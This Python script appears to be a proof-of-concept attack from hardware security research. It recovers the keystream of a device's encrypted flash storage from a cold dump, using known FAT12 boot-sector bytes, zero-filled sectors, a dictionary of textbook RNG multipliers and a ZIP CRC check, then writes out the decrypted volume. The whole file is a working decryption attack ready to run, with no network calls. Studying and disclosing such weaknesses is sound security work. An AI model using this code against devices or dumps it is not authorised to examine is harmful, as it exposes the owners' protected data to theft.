#!/usr/bin/env python3
"""Recover the storage keystream from a cold flash dump without firmware analysis

FAT12 fields and zero-filled sectors constrain the upper byte of each stream value
Several seed values can decrypt the full storage to the same bytes
See attack3/README.md for the formula, threat model, and proof limits
"""
import io
import sys
import zipfile

import numpy as np

MASK = 0xFFFFFFFF
SEC = 512               # bytes per sector
BLK = 16                # bytes per keystream block
STORAGE_OFF = 0x100000  # 0x10100000 - 0x10000000 (XIP base)
STORAGE_LEN = 0xB0000   # 704 KiB encrypted region

# Well-known public RNG / hash multipliers. B and W are expected to be in here;
# the rest are decoys a wrong guess would have to survive. Nothing here is read
# from the target firmware -- these are textbook constants.
FAMOUS = [
    0x41C64E6D,  # POSIX sample rand() LCG multiplier
    0x9E3779B1,  # Knuth multiplicative hash (golden ratio)   (2654435761)
    0x9E3779B9,  # TEA / xxHash golden-ratio constant
    0x5851F42D,  # PCG / Knuth MMIX-family multiplier
    0x6C078965,  # MT19937 initialisation multiplier
    0x08088405,  # Borland C/Delphi LCG multiplier
    0x000343FD,  # MSVC rand() LCG multiplier                 (214013)
    0x0019660D,  # Numerical Recipes LCG multiplier           (1664525)
    0x3C6EF35F,  # Numerical Recipes LCG increment            (1013904223)
    0x000041A7,  # MINSTD multiplier                          (16807)
    0x0000BC8F,  # MINSTD multiplier                          (48271)
    0xADB4A92D,  # decoy
    0x2545F491,  # xorshift-family decoy
]

# FAT12 / MS-DOS boot sector bytes any analyst predicts WITHOUT the firmware.
# Standard format values, not values copied from the target image.
KNOWN_LBA0 = {
    0x000: 0xEB, 0x002: 0x90,                          # x86 short jump + nop
    0x003: ord('M'), 0x004: ord('S'), 0x005: ord('D'), 0x006: ord('O'),
    0x007: ord('S'), 0x008: ord('5'), 0x009: ord('.'), 0x00A: ord('0'),  # "MSDOS5.0"
    0x00B: 0x00, 0x00C: 0x02,                          # bytes/sector = 512 (LE)
    0x1FE: 0x55, 0x1FF: 0xAA,                           # boot signature
}

# Reserved sectors are zero-filled by a standard MS-DOS FAT format; used as
# in-band keystream (plaintext 0x00 -> ciphertext == keystream). A wrong guess
# fails the final boot/FAT validation, so this assumption is fail-safe.
RESERVED_ZERO_LBAS = (1, 2, 3)


def lane_offset(o, B, W):
    """Position-dependent part of V within a sector for byte offset o."""
    j = o // BLK
    t = o % BLK
    return (j * B + (t - 1) * W) & MASK


# ---- interval intersection on the ring Z / 2**32 -------------------------------
# "top byte of (x + off) == kb" restricts x to a half-open arc of length 2**24.
# Arcs are lists of non-wrapping [lo, hi) segments inside [0, 2**32).

def _arc_segments(kb, off):
    start = ((kb << 24) - off) & MASK
    end = start + (1 << 24)
    if end <= (1 << 32):
        return [(start, end)]
    return [(start, 1 << 32), (0, end - (1 << 32))]


def _seg_intersect(a, b):
    out = []
    for lo1, hi1 in a:
        for lo2, hi2 in b:
            lo, hi = max(lo1, lo2), min(hi1, hi2)
            if lo < hi:
                out.append((lo, hi))
    return out


def _solve(constraints, limit=200000):
    """Return the sorted candidate list for x, or None if the surviving set is
    larger than `limit` (treated as non-converging for this hypothesis)."""
    cur = [(0, 1 << 32)]
    for kb, off in constraints:
        cur = _seg_intersect(cur, _arc_segments(kb, off))
        if not cur:
            return []
    total = sum(hi - lo for lo, hi in cur)
    if total > limit:
        return None
    return [x for lo, hi in sorted(cur) for x in range(lo, hi)]


# ---- keystream / decryption (vectorised over the whole volume) -----------------
# The pre-seed argument L*A + (o//16)*B + ((o%16)-1)*W is independent of seed, so
# it is computed once per (A,B,W); each candidate seed is then one array add.

def position_args(nsec, A, B, W):
    o = np.arange(SEC, dtype=np.uint64)
    lane = ((o // BLK) * B + ((o % BLK).astype(np.int64) - 1) * W).astype(np.uint64) & MASK
    base = ((np.arange(nsec, dtype=np.uint64) * A) & MASK)
    return ((base[:, None] + lane[None, :]) & MASK).astype(np.uint32).ravel()


def keystream_from_args(args, seed):
    return (((args + np.uint32(seed & MASK)) >> np.uint32(24)) & np.uint32(0xFF)).astype(np.uint8)


def decrypt_np(ct_arr, args, seed):
    return ct_arr ^ keystream_from_args(args, seed)


def decrypt_sector(ct, L, A, seed, B, W):
    args = position_args(L + 1, A, B, W)[L * SEC:(L + 1) * SEC]
    ct_arr = np.frombuffer(ct[L * SEC:(L + 1) * SEC], dtype=np.uint8)
    return decrypt_np(ct_arr, args, seed).tobytes()


# ---- validation ----------------------------------------------------------------

def strict_bootsector(p):
    """FAT12 boot-sector sanity beyond the bytes used as recovery constraints."""
    if p[0] not in (0xEB, 0xE9):
        return False
    if p[510] != 0x55 or p[511] != 0xAA:
        return False
    if p[3:11] != b"MSDOS5.0":
        return False
    if (p[11] | (p[12] << 8)) != 512:          # bytes/sector
        return False
    spc = p[13]                                # sectors/cluster: power of two
    if spc == 0 or (spc & (spc - 1)) != 0:
        return False
    if (p[14] | (p[15] << 8)) < 1:             # reserved sectors
        return False
    if p[16] not in (1, 2):                    # number of FATs
        return False
    if p[21] not in range(0xF0, 0x100):        # media descriptor
        return False
    return True


# ---- recovery ------------------------------------------------------------------

def volume_has_valid_zip(pt):
    """True if the decrypted volume contains a structurally valid ZIP whose
    stored CRC32s all check out. This is the decisive, firmware-free oracle: a
    seed off by a few thousand corrupts a handful of bytes and breaks a CRC."""
    start = pt.find(b"PK\x03\x04")
    eocd = pt.rfind(b"PK\x05\x06")
    if start < 0 or eocd < start:
        return False
    try:
        zf = zipfile.ZipFile(io.BytesIO(pt[start:eocd + 22]))
        return bool(zf.namelist()) and zf.testzip() is None
    except Exception:
        return False


def _seed_constraints(ct, B, W, A, zero_lbas):
    ct0 = ct[:SEC]
    cons = [(ct0[o] ^ pt, lane_offset(o, B, W)) for o, pt in KNOWN_LBA0.items()]
    for L in zero_lbas:
        ctz = ct[L * SEC:(L + 1) * SEC]
        for o in range(SEC):
            cons.append((ctz[o], (L * A + lane_offset(o, B, W)) & MASK))
    return cons


def recover(ct):
    """Full cold-dump recovery. Returns (A, seed, B, W) or None.

    Stage 1: recognise B, W in the public-constant dictionary; narrow seed with
             boot-sector known-plaintext + the always-reserved sectors.
    Stage 2: from a tentative decrypt, add every sector that came out all-zero
             (free/unused FAT and root space) as extra keystream, narrowing seed.
    Stage 3: pick the unique seed whose volume yields a CRC-valid ZIP.
    """
    nsec = len(ct) // SEC
    ct_arr = np.frombuffer(ct, dtype=np.uint8)
    for B in FAMOUS:
        A = (32 * B) & MASK
        for W in FAMOUS:
            seeds = _solve(_seed_constraints(ct, B, W, A, RESERVED_ZERO_LBAS))
            if not seeds:
                continue
            args = position_args(nsec, A, B, W)
            # stage 2: a mid candidate agrees with the truth on all low-LBA
            # structure, so its zero sectors are the real free space.
            s0 = seeds[len(seeds) // 2]
            p0 = decrypt_np(ct_arr, args, s0)
            if not strict_bootsector(p0[:SEC].tobytes()):
                continue
            zero_lbas = [L for L in range(nsec)
                         if not p0[L * SEC:(L + 1) * SEC].any()]
            seeds = _solve(_seed_constraints(ct, B, W, A, zero_lbas)) or seeds
            # stage 3: CRC-valid ZIP is the decisive discriminator.
            for seed in seeds:
                if volume_has_valid_zip(decrypt_np(ct_arr, args, seed).tobytes()):
                    return (A, seed, B, W)
    return None


def decrypt_all(ct, A, seed, B, W):
    args = position_args(len(ct) // SEC, A, B, W)
    return decrypt_np(np.frombuffer(ct, dtype=np.uint8), args, seed).tobytes()


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2
    dump = open(argv[1], "rb").read()
    ct = dump[STORAGE_OFF:STORAGE_OFF + STORAGE_LEN]
    if len(ct) < STORAGE_LEN:
        print(f"[!] dump too short: need storage at 0x{STORAGE_OFF:x}+0x{STORAGE_LEN:x}")
        return 2

    print("[*] recovering keystream generator from a cold dump (no firmware, no PIN, no device)...")
    res = recover(ct)
    if res is None:
        print("[FAIL] recovery did not converge")
        return 1
    A, seed, B, W = res
    print("[*] recovered generator parameters from ciphertext + FAT structure only:")
    print(f"      B    = 0x{B:08X}  ({'POSIX sample rand() multiplier' if B == 0x41C64E6D else 'dictionary hit'})")
    print(f"      W    = 0x{W:08X}  ({'Knuth golden-ratio hash' if W == 0x9E3779B1 else 'dictionary hit'})")
    print(f"      A    = 0x{A:08X}  (= 32*B mod 2**32, derived)")
    print(f"      seed = 0x{seed:08X}  (one of an equivalence class that decrypts")
    print(f"             the whole dump byte-for-byte identically; firmware uses 0x9E37A9EA)")

    pt = decrypt_all(ct, A, seed, B, W)
    ok_boot = strict_bootsector(pt[:SEC])
    ok_zip = volume_has_valid_zip(pt)
    print("[*] verification (intrinsic, no ground truth used):")
    print(f"      sector 0 : {pt[:16].hex(' ')}")
    print(f"      OEM name : {bytes(pt[3:11])!r}   boot sig: {pt[510:512].hex(' ')}")
    print(f"      valid FAT12 boot sector: {ok_boot}")
    if ok_zip:
        start = pt.find(b"PK\x03\x04")
        zf = zipfile.ZipFile(io.BytesIO(pt[start:pt.rfind(b"PK\x05\x06") + 22]))
        print(f"      embedded ZIP is CRC-valid, contents: {zf.namelist()}")

    out_path = argv[2] if len(argv) > 2 else "storage_decrypted.img"
    open(out_path, "wb").write(pt)
    print(f"[*] wrote decrypted volume: {out_path} ({len(pt)} bytes)")

    if ok_boot and ok_zip:
        print("[PASS] recovered the full keystream and decrypted the volume "
              "with no firmware constant and no device interaction")
        return 0
    print("[FAIL] recovered keystream did not fully validate")
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
